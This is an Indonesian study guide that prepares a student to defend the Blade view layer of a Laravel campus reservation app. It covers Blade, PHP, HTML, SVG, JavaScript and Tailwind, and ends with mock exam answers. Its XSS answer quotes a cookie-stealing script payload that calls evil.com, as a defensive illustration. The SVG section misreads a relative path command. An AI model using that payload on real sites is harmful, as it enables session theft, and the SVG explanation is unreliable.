# 09. KAMUS SINTAKS & ENSIKLOPEDIA POLA VIEW LAYER (`resources/views/`)
**Panduan Persiapan Ujian Sidang Kode Baris-per-Baris (Oral Code Defense)**  
*Aplikasi:* Resvi (Sistem Reservasi Fasilitas & Pelaporan Kendala Sarpras Kampus)  
*Workspace:* `/home/rafrusth/Attic/Programming/PPK/PPK-Room-Reservation`  
*Fokus:* Template Engine Laravel Blade, Semantik HTML5, Skrip JavaScript Klien, Format Vektor SVG, & Utilitas Tailwind CSS 4

---

## DAFTAR ISI
1. [BAB 1: Direktif & Interpolasi Blade Laravel](#bab-1-direktif--interpolasi-blade-laravel)
2. [BAB 2: Ekspresi PHP & Struktur Data di Dalam Blade](#bab-2-ekspresi-php--struktur-data-di-dalam-blade)
3. [BAB 3: Semantik & Struktur Kontrol HTML5](#bab-3-semantik--struktur-kontrol-html5)
4. [BAB 4: Grafika Vektor SVG & Ikon Antarmuka](#bab-4-grafika-vektor-svg--ikon-antarmuka)
5. [BAB 5: Client-Side JavaScript (Manipulasi DOM & Browser API)](#bab-5-client-side-javascript-manipulasi-dom--browser-api)
6. [BAB 6: Pola Desain CSS (Tailwind CSS 4 Dark-Mode Minimalis)](#bab-6-pola-desain-css-tailwind-css-4-dark-mode-minimalis)
7. [BAB 7: Simulasi Ujian Sidang Khusus View Layer (Oral Defense Grilling)](#bab-7-simulasi-ujian-sidang-khusus-view-layer-oral-defense-grilling)

---

# BAB 1: DIREKTIF & INTERPOLASI BLADE LARAVEL

Lapisan tampilan Laravel dikompilasi dari berkas `.blade.php` menjadi PHP murni di folder cache `storage/framework/views/`. Berikut adalah dekonstruksi sintaks inti Blade:

### 1.1 `{{ ... }}` vs `{!! ... !!}` (Output Escaping)
- **Bentuk Sintaks:**
  ```blade
  {{ $reservation['facility_name'] }}
  {!! $rawHtmlContent !!}
  ```
- **Fungsi & Mekanisme Runtime:**
  - `{{ ... }}` otomatis memanggil helper internal `e()` milik Laravel yang membungkus `htmlspecialchars($data, ENT_QUOTES, 'UTF-8', true)`. Karakter khusus seperti `<`, `>`, `&`, `"`, dan `'` diubah menjadi entitas HTML (`&lt;`, `&gt;`, dll.).
  - `{!! ... !!}` mencetak data mentah tanpa escaping.
- **Justifikasi Pertahanan Sidang:**  
  *Mengapa selalu menggunakan `{{ ... }}`?* Untuk mencegah celah keamanan **Cross-Site Scripting (XSS)**. Jika nama pemohon atau deskripsi kendala mengandung injeksi skrip `<script>alert('hack')</script>`, sintaks kurung kurawal ganda menjamin skrip tersebut hanya dirender sebagai teks biasa di DOM peramban.

---

### 1.2 `{{ route('...', [...]) }}` (Named Route URL Generation)
- **Bentuk Sintaks:**
  ```blade
  {{ route('facilities.show', ['facility' => $facility['id']]) }}
  {{ route('admin.recaps.export', array_merge(request()->query(), ['format' => 'pdf'])) }}
  ```
- **Fungsi & Mekanisme Runtime:**  
  Menghasilkan URL absolut secara dinamis berdasarkan nama rute yang didefinisikan pada `routes/web.php`.
- **Justifikasi Pertahanan Sidang:**  
  Menerapkan prinsip *Decoupling* dan *Maintainability*. Jika di masa mendatang struktur URL diubah dari `/facilities/{id}` menjadi `/sarpras/ruang/{id}`, kita tidak perlu mengubah ratusan tautan di template Blade karena nama rutenya (`facilities.show`) tetap sama.

---

### 1.3 `{{ session('success') }}` & `session('error')` (Flash Session Data)
- **Bentuk Sintaks:**
  ```blade
  @if (session('success'))
      <div class="p-3 bg-[#002b11] border border-[#005522] text-[#50e3c2] text-xs rounded-[6px]">
          {{ session('success') }}
      </div>
  @endif
  ```
- **Fungsi & Mekanisme Runtime:**  
  Membaca pesan umpan balik (*flash message*) yang dikirimkan oleh Controller melalui `redirect()->with('success', '...')`. Data dalam flash session hanya bertahan selama 1 siklus request dan otomatis dihapus dari session storage setelah dibaca.

---

### 1.4 `$errors->all()`, `$errors->any()`, & `@error` (Validation Bags)
- **Bentuk Sintaks:**
  ```blade
  @if ($errors->any())
      <ul class="list-disc list-inside">
          @foreach ($errors->all() as $error)
              <li>{{ $error }}</li>
          @endforeach
      </ul>
  @endif

  @error('rejection_reason')
      <span class="text-[11px] text-[#ff453a]">{{ $message }}</span>
  @enderror
  ```
- **Fungsi & Mekanisme Runtime:**  
  - `$errors` adalah instans global `Illuminate\Support\ViewErrorBag` yang selalu disuntikkan oleh middleware `ShareErrorsFromSession`.
  - `$errors->any()` mengembalikan boolean apakah ada kegagalan validasi.
  - `$errors->all()` mengembalikan array seluruh pesan kesalahan.
  - Direktif `@error('field')` bertindak sebagai shortcut bersyarat; variabel `$message` secara otomatis tersedia di dalam blok untuk menampilkan pesan spesifik field tersebut.

---

### 1.5 `@csrf` (Cross-Site Request Forgery Protection)
- **Bentuk Sintaks:**
  ```blade
  <form method="POST" action="...">
      @csrf
  ```
- **Fungsi & Mekanisme Runtime:**  
  Dikompresi oleh Blade Compiler menjadi input tersembunyi:
  ```html
  <input type="hidden" name="_token" value="dGhpcy1pcy1hLXNlY3VyZS10b2tlbg==">
  ```
- **Justifikasi Pertahanan Sidang:**  
  Melindungi server dari serangan pemalsuan permintaan antar situs (CSRF). Middleware `ValidateCsrfToken` mencocokkan token kiriman form ini dengan token sesi aktif pengguna. Jika tidak cocok, request ditolak dengan kode status HTTP 419 Page Expired.

---

### 1.6 `@method('PUT')` & `@method('DELETE')` (HTTP Method Spoofing)
- **Bentuk Sintaks:**
  ```blade
  <form method="POST" action="{{ route('admin.facilities.update', $facility->id) }}">
      @csrf
      @method('PUT')
  ```
- **Fungsi & Mekanisme Runtime:**  
  Form HTML murni pada standar browser hanya mendukung metode `GET` dan `POST`. Direktif ini mencetak `<input type="hidden" name="_method" value="PUT">`. Saat request masuk, HTTP Kernel Laravel membaca nilai `_method` dan meneruskannya ke rute `Route::put(...)`.

---

### 1.7 `@extends`, `@section`, `@yield`, `@push`, `@stack` (Template Inheritance)
- **Bentuk Sintaks:**
  ```blade
  // Layout Master (layouts/app.blade.php):
  <head>
      <title>@yield('title', 'Resvi Kampus')</title>
      @stack('styles')
  </head>
  <body>
      @yield('content')
      @stack('scripts')
  </body>

  // View Anak (facilities/index.blade.php):
  @extends('layouts.app')
  @section('title', 'Katalog Fasilitas')
  @section('content')
      <!-- Konten Utama -->
  @endsection
  @push('scripts')
      <script>console.log('Script khusus halaman ini');</script>
  @endpush
  ```
- **Mekanisme Runtime:**  
  `@yield` menetapkan titik injeksi konten statis, sedangkan `@stack` dan `@push` memungkinkan view anak mendorong skrip atau stylesheet secara dinamis ke tumpukan (*stack*) di layout induk tanpa menimpa skrip lain.

---

### 1.8 `@forelse ... @empty ... @endforelse` (Empty State Loop)
- **Bentuk Sintaks:**
  ```blade
  @forelse ($facilities as $facility)
      <tr><td>{{ $facility->name }}</td></tr>
  @empty
      <tr><td colspan="5">Tidak ada fasilitas ditemukan.</td></tr>
  @endforelse
  ```
- **Mekanisme Runtime:**  
  Diterjemahkan menjadi perulangan `foreach`, namun jika variabel koleksi kosong (`count() === 0`), eksekusi dialihkan langsung ke blok `@empty`. Ini meniadakan penulisan boilerplate `if(count > 0) foreach else`.

---

# BAB 2: EKSPRESI PHP & STRUKTUR DATA DI DALAM BLADE

Di dalam blok `@php ... @endphp` dan interpolasi data, aplikasi Resvi menerapkan pola-pola manipulasi data tingkat lanjut:

---

### 2.1 Operator Ternary: `$x === 'ss' ? 'a' : 'b'`
- **Bentuk Sintaks Real (diambil dari `staff/reservations/show.blade.php`):**
  ```blade
  {{ $statusVal === 'dibatalkan_oleh_pengguna' ? 'Dibatalkan Pengguna' : 'Dibatalkan Petugas' }}
  ```
  ```blade
  class="{{ $isSelected ? 'bg-[#1f1f1f] text-white' : 'text-[#cccccc]' }}"
  ```
- **Fungsi & Mekanisme Runtime:**  
  Evaluasi ekspresi kondisional sebaris (*inline conditional*). Jika kondisi bernilai `true`, kembalikan operand kedua (`'a'`); jika `false`, kembalikan operand ketiga (`'b'`). Sangat sering digunakan untuk *conditional class injection* pada Tailwind CSS.

---

### 2.2 Operator Null Coalescing: `??`
- **Bentuk Sintaks Real (diambil dari `user/reports/create.blade.php`):**
  ```php
  $initCategoryLabel = $categories[$preselectedCat] ?? 'Pilih Kategori';
  ```
- **Fungsi & Mekanisme Runtime:**  
  Mengevaluasi apakah variabel di sisi kiri ada (`isset`) dan tidak bernilai `null`. Jika ada, gunakan nilai tersebut; jika tidak ada atau bernilai `null`, fallback ke nilai di sisi kanan (`'Pilih Kategori'`).
- **Keunggulan Dibandingkan Ternary Biasa:**  
  Mencegah PHP melemparkan galat *Notice / Warning: Undefined array key* jika indeks `$preselectedCat` tidak ditemukan dalam array `$categories`.

---

### 2.3 Rantai Fallback Prefill: `old('...', request('...', ''))`
- **Bentuk Sintaks Real (diambil dari `user/reports/create.blade.php` baris 51):**
  ```php
  $preselectedFacilityId = old('facility_id', request('facility_id', ''));
  ```
- **Fungsi & Mekanisme Runtime:**  
  Menerapkan **Hierarki Prioritas Tiga Tingkat (Three-Tier State Precedence)**:
  1. **Tingkat 1 (`old('facility_id')`):** Mengambil input dari flash session saat validasi form sebelumnya gagal (prioritas tertinggi agar ketikan user tidak hilang).
  2. **Tingkat 2 (`request('facility_id')`):** Mengambil nilai parameter URL query string (misal pengguna mengklik tombol "Laporkan Kerusakan" langsung dari halaman detail fasilitas `/facilities/5`).
  3. **Tingkat 3 (`''`):** String kosong sebagai fallback default jika kedua sumber di atas tidak ada.

---

### 2.4 Array Mapping / Lookup Table
- **Bentuk Sintaks Real (diambil dari `user/reports/create.blade.php` baris 91–97):**
  ```php
  $categories = [
      'kerusakan_fisik' => 'Kerusakan Fisik (Pintu, Jendela, Kursi, Meja, Tembok)',
      'kerusakan_elektronik' => 'Kerusakan Elektronik (AC, Proyektor, Lampu, PC, Stopkontak)',
      'kebersihan' => 'Kebersihan Ruangan & Sanitasi',
      'keamanan' => 'Keamanan / Kehilangan Fasilitas',
      'lainnya' => 'Lainnya (Tuliskan detail pada deskripsi)'
  ];
  ```
- **Fungsi & Mekanisme Runtime:**  
  Struktur *Key-Value Hash Map* di sisi presentasi yang memetakan kode enum teknis yang disimpan di database (key) ke label deskriptif berbahasa Indonesia yang mudah dipahami oleh pengguna kampus (value).

---

### 2.5 Pipeline Laravel Collection: `collect(...)->firstWhere(...)`
- **Bentuk Sintaks Real (diambil dari `user/reports/create.blade.php` baris 52):**
  ```php
  $preselectedFacility = collect($facilities)->firstWhere('id', $preselectedFacilityId);
  ```
- **Fungsi & Mekanisme Runtime:**  
  - `collect($facilities)`: Membungkus array fasilitas mentah ke dalam objek `Illuminate\Support\Collection`.
  - `->firstWhere('id', $preselectedFacilityId)`: Menelusuri elemen koleksi dan mengembalikan elemen pertama yang atribut `'id'`-nya cocok dengan target secara linier $O(N)$. Jika tidak ada yang cocok, mengembalikan `null`.

---

### 2.6 Akses Array vs Properti Objek Model: `{{ $reservation['facility_location'] }}`
- **Bentuk Sintaks:**
  ```blade
  {{ $reservation['facility_location'] }}  // Array Access Notation
  {{ $reservation->facility->location }}    // Object Property Notation
  ```
- **Mengapa Array Access Digunakan?**  
  Pada beberapa Controller petugas dan admin di Resvi, data yang dikirimkan ke View telah diproses melalui DTO (*Data Transfer Object*) atau ditransformasikan melalui array terflatisasi (`toArray()`) untuk:
  1. Mencegah pemanggilan query tersembunyi (*Lazy Loading Violation*) di dalam View.
  2. Memastikan pemisahan mutlak antara lapisan domain database dan lapisan presentasi.

---

### 2.7 Backed Enums Handling di PHP 8.4
- **Bentuk Sintaks Real (diambil dari `staff/reservations/show.blade.php`):**
  ```php
  $statusVal = $reservation['status'] instanceof \BackedEnum 
      ? $reservation['status']->value 
      : (string) $reservation['status'];
  ```
- **Fungsi & Mekanisme Runtime:**  
  Di PHP 8.4, status reservasi adalah instance dari enum `ReservationStatus`. Jika dicetak langsung sebagai string, PHP akan melempar *Error: Object of class App\Enums\ReservationStatus could not be converted to string*. Pengecekan `instanceof \BackedEnum` mengekstrak properti scalar `$status->value` secara aman.

---

### 2.8 Manipulasi Waktu Carbon & Format Angka
- **Bentuk Sintaks Real:**
  ```blade
  {{ now()->toDateString() }}
  {{ Carbon::parse($date)->locale('id')->translatedFormat('d F Y') }}
  {{ number_format($row['used_hours'], 2, ',', '.') }} Jam
  ```
- **Fungsi & Mekanisme Runtime:**  
  - `locale('id')->translatedFormat('F')` mengonversi bulan angka menjadi nama bulan resmi Indonesia (*Januari, Februari, Maret...*).
  - `number_format($angka, 2, ',', '.')` memformat bilangan desimal dengan 2 angka di belakang koma, menggunakan koma `,` sebagai pemisah desimal dan titik `.` sebagai pemisah ribuan standar Indonesia.

---

# BAB 3: SEMANTIK & STRUKTUR KONTROL HTML5

Semua elemen antarmuka di Resvi dibangun di atas standar HTML5 modern:

---

### 3.1 Elemen Struktur & Tipografi
- `<a>href="..."</a>`: Elemen penjangkar (*anchor*). Mendefinisikan hyperlink navigasi antar halaman web.
- `<span>`: Kontainer inline tanpa makna semantik bawaan. Digunakan untuk memberi gaya CSS pada sebagian kata (misal tanda bintang merah `<span class="text-[#ff453a]">*</span>` atau teks status kecil).
- `<p>`: Paragraf teks blok dengan jarak margin vertikal bawaan peramban.
- `<ul>`, `<ol>`, `<li>`: Daftar tidak terurut (*unordered list*), daftar terurut (*ordered list*), dan item daftar (*list item*). Digunakan pada kotak error validasi `$errors->all()`.

---

### 3.2 Struktur Tabulasi Data (Tabel Antrean & Rekapitulasi)
Diambil dari `staff/reservations/index.blade.php` dan `admin/recaps/index.blade.php`:
```html
<table class="w-full text-left">
    <thead>
        <tr>
            <th>Nomor Tiket</th>
            <th>Pemohon</th>
            <th>Status</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>RSV-20261012-0001</td>
            <td>Ahmad Dahlan</td>
            <td>Menunggu</td>
        </tr>
    </tbody>
</table>
```
- `<table>`: Kontainer tabel data dua dimensi.
- `<thead>`: Mengelompokkan baris header tabel (*table header block*), penting untuk aksesibilitas screen reader.
- `<tbody>`: Mengelompokkan baris data isi tabel (*table body block*).
- `<tr>` (*Table Row*): Mendefinisikan baris horizontal dalam tabel.
- `<th>` (*Table Header Cell*): Mendefinisikan sel judul kolom (otomatis tebal dan terpusat secara semantik).
- `<td>` (*Table Data Cell*): Mendefinisikan sel data individual di dalam baris.

---

### 3.3 Atribut Form & Kontrol Validasi HTML5
- `step="1800"`: Diterapkan pada `<input type="time">`. Angka 1800 detik (= 30 menit) membatasi pemilih jam browser agar hanya bisa melompat per 30 menit (misal: 08:00, 08:30, 09:00).
- `min="{{ now()->toDateString() }}"`: Atribut HTML5 yang menonaktifkan pemilihan tanggal masa lalu pada kalender browser secara visual.
- `enctype="multipart/form-data"`: Menginstruksikan peramban untuk memecah request body menjadi beberapa partisi biner terpisah agar berkas gambar dapat diunggah.
- `required`: Atribut boolean HTML5 yang memicu validasi bawaan browser (*client-side native tooltip*) sebelum form dapat dikirim.
- `data-*` (Custom Data Attributes):
  ```html
  <tr data-search="ahmad dahlan aula utama" data-type="aula" data-status="menunggu">
  ```
  Menyimpan metadata khusus aplikasi pada elemen DOM yang dapat dibaca secara instan oleh JavaScript via `element.dataset.search`.

---

# BAB 4: GRAFIKA VEKTOR SVG & IKON ANTARMUKA

Aplikasi Resvi tidak menggunakan font ikon pihak ketiga (seperti FontAwesome) melainkan ikon inline SVG murni untuk performa zero-request:

```html
<svg class="w-4 h-4 text-[#888888]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <path d="M6 18L18 6M6 6l12 12"></path>
</svg>
```

### Dekonstruksi Atribut SVG:
1. `<svg>`: Kontainer Scalable Vector Graphics berbasis XML. Berbeda dengan PNG/JPG yang pecah saat diperbesar (*raster/pixel-based*), SVG dihitung secara matematis (*vector-based*) sehingga selalu tajam di resolusi apa pun.
2. `viewBox="0 0 24 24"`: Mendefinisikan sistem koordinat kanvas internal grafik:
   - `0 0`: Koordinat titik asal $(X, Y)$ kiri atas kanvas.
   - `24 24`: Lebar dan tinggi kanvas virtual (24 unit $\times$ 24 unit).
3. `fill="none"`: Bagian dalam kurva bentuk tidak diisi warna (transparan).
4. `stroke="currentColor"`: Garis gambar mengadopsi warna teks CSS saat ini (*CSS current color inheritance*). Jika elemen induk diberi class `text-white`, ikon otomatis berwarna putih; jika `text-[#ff453a]`, ikon otomatis merah.
5. `stroke-width="2"`: Ketebalan garis gambar sebesar 2 unit kanvas.
6. `stroke-linecap="round"` & `stroke-linejoin="round"`: Ujung garis dan titik temu antar garis dibuat membulat (*rounded caps/joins*).
7. `<path d="...">`: Elemen jalur grafis vektor. Atribut `d` (*data*) berisi serangkaian instruksi pena koordinat:
   - `M6 18` (*Move to*): Angkat pena dan pindah ke koordinat $(X=6, Y=18)$.
   - `L18 6` (*Line to*): Tarik garis lurus dari titik saat ini ke koordinat $(X=18, Y=6)$.
   - `M6 6 L12 12`: Pindah ke $(6,6)$ lalu tarik garis silang kedua ke $(12,12)$ membentuk ikon silang penutup (Close/Cancel).

---

# BAB 5: CLIENT-SIDE JAVASCRIPT (DOM & BROWSER API)

Skrip interaktif pada view Resvi dibangun menggunakan **Vanilla JavaScript modern** tanpa ketergantungan library berat:

---

### 5.1 Manipulasi Dialog Modal: `classList.remove('hidden')`
- **Bentuk Sintaks Real (diambil dari modal pembatalan & penolakan):**
  ```javascript
  document.getElementById('cancelModal').classList.remove('hidden');
  document.getElementById('cancelModal').classList.add('hidden');
  ```
- **Mekanisme Runtime:**  
  Elemen modal memiliki class CSS Tailwind `hidden` (`display: none;`).
  - Pemanggilan `.classList.remove('hidden')` menghapus class tersebut dari DOM tree, sehingga modal langsung dirender di atas layar sebagai flexbox overlay (`fixed inset-0 z-50`).
  - Pemanggilan `.classList.add('hidden')` mengembalikan `display: none;`, menyembunyikan modal seketika tanpa perlu manipulasi style inline kotor (`style.display = 'block'`).

---

### 5.2 Pencarian & Penyaringan Antrean Instan di Memori Klien
- **Bentuk Sintaks Real (diambil dari `staff/reservations/index.blade.php`):**
  ```javascript
  const searchQueue = document.getElementById('searchQueue');
  const rows = document.querySelectorAll('#queueTable tbody tr[data-search]');

  function filterTable() {
      const query = searchQueue.value.toLowerCase().trim();
      rows.forEach(row => {
          const matches = !query || row.dataset.search.includes(query);
          row.style.display = matches ? '' : 'none';
      });
  }

  searchQueue.addEventListener('input', filterTable);
  ```
- **Mekanisme Runtime:**  
  Event `input` mendengarkan setiap ketukan keyboard pengguna. Setiap baris `<tr>` dicek apakah string pencarian terdapat di dalam atribut `row.dataset.search`. Baris yang tidak cocok diubah menjadi `display: none`. Proses ini berlangsung di memori RAM browser dalam hitungan milidetik tanpa memicu request HTTP ke server Laravel.

---

### 5.3 Asynchronous AJAX / Fetch API (Pengecekan Ketersediaan Real-Time)
- **Bentuk Sintaks Real (diambil dari `facilities/show.blade.php`):**
  ```javascript
  const response = await fetch("{{ route('reservations.check_availability') }}", {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
          'Accept': 'application/json'
      },
      body: JSON.stringify({
          facility_id: facilityId,
          date: date,
          start_time: startTime,
          end_time: endTime
      })
  });
  const data = await response.json();
  ```
- **Mekanisme Runtime:**  
  Mengirim request HTTP asinkron di latar belakang tanpa me-refresh seluruh halaman web. Menghubungi endpoint backend, memvalidasi CSRF token via HTTP header `X-CSRF-TOKEN`, dan mengurai respon JSON untuk mengubah status visual ketersediaan di layar klien.

---

### 5.4 Pratinjau Berkas Gambar Lokal (FileReader API)
- **Bentuk Sintaks Real (diambil dari `user/reports/create.blade.php`):**
  ```javascript
  const reader = new FileReader();
  reader.onload = function(e) {
      document.getElementById('image_preview').src = e.target.result;
      document.getElementById('preview_container').classList.remove('hidden');
  };
  reader.readAsDataURL(file);
  ```
- **Mekanisme Runtime:**  
  Objek `FileReader` membaca stream biner berkas gambar langsung dari hard disk lokal pengguna dan mengonversinya menjadi URL data base64 (`data:image/png;base64,...`). Gambar pratinjau muncul seketika di layar sebelum file sempat diunggah ke server.

---

### 5.5 Papan Klip Sistem: `navigator.clipboard.writeText(...)`
- **Bentuk Sintaks Real (diambil dari `admin/accounts/created.blade.php`):**
  ```javascript
  navigator.clipboard.writeText(document.getElementById('pwd_val').textContent);
  ```
- **Mekanisme Runtime:**  
  Mengakses Web API Clipboard asynchronous browser untuk menyalin kata sandi satu kali lihat langsung ke memori clipboard sistem operasi pengguna tanpa memerlukan library Flash/ZeroClipboard pihak ketiga.

---

# BAB 6: POLA DESAIN CSS (TAILWIND CSS 4 DARK-MODE MINIMALIS)

Aplikasi Resvi mengadopsi tema *Geist / Vercel-inspired Minimalist Dark Palette*:

### 6.1 Fondasi Warna & Border
- `bg-[#0a0a0a]` & `bg-[#111111]`: Hitam pekat OLED dan abu-abu gelap terstruktur untuk kartu (*card container*).
- `border-[#333333]`: Border mikro 1 piksel tegas tanpa efek bayangan lembut (*no soft blur shadows*).
- `rounded-[6px]`: Radius sudut mikro 6 piksel modern (bukan `rounded-xl` atau `rounded-2xl` yang membulat berlebihan).

### 6.2 Tipografi & Tata Letak
- `font-mono`: Menggunakan font *monospaced* untuk nomor registrasi tiket (`RSV-20261012-0001`), jam waktu, dan badge kode.
- `tracking-wider` & `uppercase`: Huruf kapital spasi renggang untuk label form mikro (`text-[10px]`).
- `flex items-center justify-between`: Tata letak flexbox satu dimensi.
- `grid grid-cols-1 sm:grid-cols-3 gap-4`: Grid responsif CSS: 1 kolom di layar ponsel (< 640px) dan otomatis 3 kolom di layar tablet/desktop ($\ge$ 640px).

### 6.3 State & Transisi Interaktif
- `backdrop-blur-sm`: Efek kaca buram modern pada layer overlay modal.
- `animate-pulse`: Efek denyut visual pada indikator status "Menunggu Persetujuan" dan "Sedang Berlangsung".
- `hover:border-[#555555] transition-colors`: Transisi halus saat kursor mouse melintasi elemen input.

---

# BAB 7: SIMULASI UJIAN SIDANG KHUSUS VIEW LAYER (ORAL DEFENSE GRILLING)

Gunakan daftar pertanyaan dan jawaban teknis berikut untuk menghadapi pengujian sidang akademik seputar lapisan Blade view:

---

### Pertanyaan 1: Mekanisme Kompilasi Template Blade
> **Tanya (Dosen Penguji / Tech Lead):**  
> *"Bagaimana peramban (browser) bisa memahami direktif seperti `@extends`, `@if`, dan `{{ route(...) }}`? Apakah browser mengeksekusi file `.blade.php` secara langsung?"*  
>  
> **Jawab (Rekomendasi Jawaban Anda):**  
> *"Browser sama sekali tidak pernah menerima atau mengeksekusi sintaks Blade.  
> Ketika permintaan HTTP masuk, Laravel Blade Compiler membaca file `.blade.php` di `resources/views/`. Compiler menerjemahkan seluruh direktif Blade menjadi kode PHP murni: misalnya `@if` diubah menjadi `<?php if(...): ?>`, dan `{{ $data }}` diubah menjadi `<?php echo e($data); ?>`.  
> Hasil terjemahan ini disimpan sebagai berkas cache berekstensi `.php` di direktori `storage/framework/views/`. File cache inilah yang dieksekusi oleh mesin PHP runtime di kontainer `ppk_app` untuk menghasilkan output murni HTML5, CSS, dan JavaScript yang kemudian dikirimkan melalui protokol HTTP ke peramban klien."*  
>  
> **Poin Kunci Wajib Sebut:**  
> `[Blade Compiler]`, `[storage/framework/views Cache]`, `[PHP Runtime Execution]`, `[Pure HTML5 HTTP Response]`.

---

### Pertanyaan 2: Mengapa Menggunakan Custom Dropdown DIV + JS Dibanding `<select>` Bawaan?
> **Tanya (Dosen Penguji / Tech Lead):**  
> *"Di `user/reports/create.blade.php`, mengapa Anda membuat dropdown kustom menggunakan susunan tag `<div>`, `<input type="hidden">`, dan fungsi JavaScript `toggleCustomDropdown()`, alih-alih cukup menggunakan tag standar HTML `<select>`?"*  
>  
> **Jawab (Rekomendasi Jawaban Anda):**  
> *"Ada dua alasan arsitektural dan user experience (UX):  
> 1. **Keterbatasan Styling Tag `<select>`:** Elemen bawaan browser `<select>` dan `<option>` dirender langsung oleh sistem operasi (OS-level widget). Akibatnya, `<option>` tidak dapat diberi gaya tema gelap kustom (seperti warna hex spesifik `#111111`, font monospace, ikon centang status `#50e3c2`, atau pembagian layout grid).  
> 2. **Integrasi Data State & Form Submission:** Dengan komponen dropdown kustom, kita mempertahankan fleksibilitas UI sembari tetap menjaga kepatuhan form HTML melalui tag `<input type="hidden" name="category" value="...">`. Saat item div diklik, JavaScript memperbarui nilai input tersembunyi tersebut, sehingga saat tombol submit ditekan, payload HTTP yang dikirimkan ke Controller tetap identik dengan form standar."*  
>  
> **Poin Kunci Wajib Sebut:**  
> `[OS-level Widget Limitation]`, `[Custom Design System Cohesion]`, `[Hidden Input Value Synchronization]`, `[Standard HTTP Form Payload Compatibility]`.

---

### Pertanyaan 3: Analisis Rantai `old('facility_id', request('facility_id', ''))`
> **Tanya (Dosen Penguji / Tech Lead):**  
> *"Jelaskan secara tepat apa maksud kode `$preselectedFacilityId = old('facility_id', request('facility_id', ''))` pada `reports/create.blade.php` baris 51! Mengapa urutannya harus `old()` terlebih dahulu baru kemudian `request()`?"*  
>  
> **Jawab (Rekomendasi Jawaban Anda):**  
> *"Kode tersebut adalah implementasi **Pola Fallback State Tiga Tingkat (Three-Tier State Precedence)**:  
> - Fungsi `old('facility_id', $default)` membaca input sesi form sebelumnya saat terjadi kegagalan validasi server-side.  
> - Jika ada error validasi, nilai yang diketikkan pengguna sebelum submit disimpan di flash session, sehingga fungsi `old()` mengembalikan data tersebut agar formulir tidak ter-reset (*Preserving User Input*).  
> - Jika ini adalah kunjungan pertama kali (bukan pengiriman form yang gagal), fungsi `old()` akan jatuh ke parameter kedua, yaitu `request('facility_id', '')`. Parameter ini membaca query string dari URL (misal user datang dari tautan `/reports/create?facility_id=12`).  
> - Jika pengguna membuka halaman kosong tanpa parameter URL, fallback terakhir adalah string kosong `''`.  
> Urutan ini wajib: jika `request()` diletakkan di depan `old()`, maka saat pengguna sengaja mengganti pilihan fasilitas lalu formnya gagal validasi, pilihannya akan tertimpa kembali oleh nilai awal di URL alih-alih pilihan terbarunya."*  
>  
> **Poin Kunci Wajib Sebut:**  
> `[Three-Tier State Precedence]`, `[Preserving User Input (Repopulation)]`, `[Validation Failure Recovery]`, `[Query String Deep-linking]`.

---

### Pertanyaan 4: Perbedaan Keamanan `{{ ... }}` dan Mitigasi XSS
> **Tanya (Dosen Penguji / Tech Lead):**  
> *"Jika seorang penyerang memasukkan nama fasilitas `'Lab Komputer <script>fetch(\"http://evil.com?c=\"+document.cookie)</script>'`, bagaimana sintaks `{{ $facility->name }}` di Blade melindungi akun staf yang membuka halaman tersebut?"*  
>  
> **Jawab (Rekomendasi Jawaban Anda):**  
> *"Sintaks `{{ ... }}` memanggil helper `e()` yang menerapkan fungsi PHP `htmlspecialchars(..., ENT_QUOTES, 'UTF-8', true)`.  
> Teks injeksi penyerang akan dikonversi menjadi entitas teks aman:  
> `&lt;script&gt;fetch(...)&lt;/script&gt;`.  
> Ketika browser menerima respon HTML ini, parser HTML browser memperlakukannya sebagai karakter teks tulisan biasa di dalam dokumen teks, bukan sebagai elemen DOM executable `<script>`. Dengan demikian, kode JavaScript penyerang tidak pernah dieksekusi di memori browser pengguna, menggagalkan pencurian cookie sesi atau serangan Stored XSS secara mutlak."*  
>  
> **Poin Kunci Wajib Sebut:**  
> `[Stored Cross-Site Scripting (XSS) Mitigation]`, `[HTML Entity Encoding]`, `[htmlspecialchars(ENT_QUOTES)]`, `[Non-executable Text Representation]`.

---

### Pertanyaan 5: Peran Atribut `viewBox` dan `stroke="currentColor"` pada Ikon SVG
> **Tanya (Dosen Penguji / Tech Lead):**  
> *"Jelaskan mengapa ikon pada Blade ditulis menggunakan `<svg viewBox="0 0 24 24" stroke="currentColor">` alih-alih menetapkan `width="16px" height="16px" stroke="#ffffff"` secara langsung di atributnya?"*  
>  
> **Jawab (Rekomendasi Jawaban Anda):**  
> *"Pola ini menerapkan prinsip **CSS Scalability & Color Adaptability**:  
> 1. Atribut `viewBox="0 0 24 24"` mendefinisikan rasio aspek koordinat virtual independen. Ukuran fisik ikon kemudian diatur oleh utilitas CSS Tailwind (misal `w-3.5 h-3.5` atau `w-6 h-6`). Ini memungkinkan ikon yang sama diskalakan ke berbagai resolusi tanpa mendistorsi proporsi bentuknya.  
> 2. `stroke="currentColor"` menginstruksikan garis vektor untuk mewarisi nilai properti CSS `color` dari elemen induknya. Jika elemen induk memiliki class Tailwind `text-[#ff453a]`, ikon otomatis berwarna merah; jika tombol di-hover dan class berubah menjadi `hover:text-white`, ikon otomatis berganti warna putih tanpa perlu memanipulasi atribut internal SVG sama sekali."*  
>  
> **Poin Kunci Wajib Sebut:**  
> `[Virtual Coordinate Aspect Ratio (viewBox)]`, `[CSS currentColor Keyword]`, `[Declarative Color Inheritance]`, `[Resolution-Independent Scalability]`.

